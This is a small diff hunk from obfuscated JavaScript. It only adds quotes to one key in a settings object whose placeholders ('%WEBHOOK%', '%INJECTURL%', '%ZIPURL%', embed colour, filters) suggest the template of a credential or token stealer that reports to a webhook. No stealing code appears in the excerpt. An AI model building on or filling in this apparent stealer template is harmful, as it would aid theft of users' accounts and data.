@@ -154,7 +154,7 @@ const _0x149afa = {
 };
 const _0x51c9c6 = {
   "webhook": "%WEBHOOK%",
-  injection_url: "%INJECTURL%",
+  "injection_url": "%INJECTURL%",
   "zipfile_url": "%ZIPURL%",
   "embedcolor": "%EMBEDCOLOR%",
   "filters": _0x2b0255,
